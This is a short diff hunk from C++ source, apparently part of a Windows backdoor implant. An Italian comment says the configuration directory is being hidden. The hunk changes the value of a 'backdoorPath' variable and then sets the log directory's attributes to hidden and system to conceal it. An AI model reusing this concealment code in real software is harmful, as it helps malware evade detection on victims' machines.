@@ -57,7 +57,8 @@ BOOL Core::Run() {
 
 	// Nascondiamo la directory dove c'e' il file di configurazione
 	/////backdoorPath = L"\\windows";
-	backdoorPath = L".\\";
+	///BYGIO backdoorPath = L".\\";
+	backdoorPath = L"";
 	backdoorPath += LOG_DIR;
 	SetFileAttributes(backdoorPath.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
 /***
